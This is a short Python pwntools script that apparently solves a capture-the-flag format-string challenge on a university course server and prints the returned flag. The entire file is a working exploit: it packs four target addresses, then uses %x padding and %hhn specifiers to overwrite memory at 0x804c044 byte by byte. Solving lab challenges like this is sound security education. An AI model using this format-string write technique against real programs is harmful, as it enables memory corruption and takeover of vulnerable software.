from pwn import remote, p32

SERVER = "mustard.stt.rnl.tecnico.ulisboa.pt"
PORT = 23196

remote = remote(SERVER, PORT, timeout=10000)

target_address = 0x804c044

buffer = p32(target_address + 3) + p32(target_address + 2) + p32(target_address + 1) + p32(target_address) + \
         b"%206x" + b"%7$hhn" + b"%207x" + b"%8$hhn" + b"%273x" + b"%9$hhn" + b"%305x" + b"%10$hhn"

remote.sendline(buffer)
flag = remote.recvline_contains(b"SSof")
print(flag.decode())